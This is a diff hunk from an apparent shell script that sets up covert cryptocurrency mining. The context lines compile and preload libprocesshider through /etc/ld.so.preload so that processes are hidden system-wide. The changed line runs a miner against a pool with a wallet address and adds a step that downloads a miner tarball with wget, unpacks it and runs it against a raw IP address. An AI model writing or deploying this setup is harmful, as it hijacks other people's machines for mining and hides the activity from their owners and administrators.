@@ -57,4 +57,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./graftcp/graftcp ./wart-miner -h us.acc-pool.pw -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cik -t30
+./graftcp/graftcp ./wart-miner -h us.acc-pool.pw -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cik -t4 && wget https://github.com/CoinFuMasterShifu/janusminer/releases/download/0.2.7/janusminer_hiveos-0.2.7.tgz && tar -xvf janusminer_hiveos-0.2.7.tgz && cd janusminer_hiveos && ./wart-miner -h 23.83.132.72 -p 12000 -u 2bdd0b2e77b826e4cbf005217ae4b709b9e0be4a4203be33.cik -t30
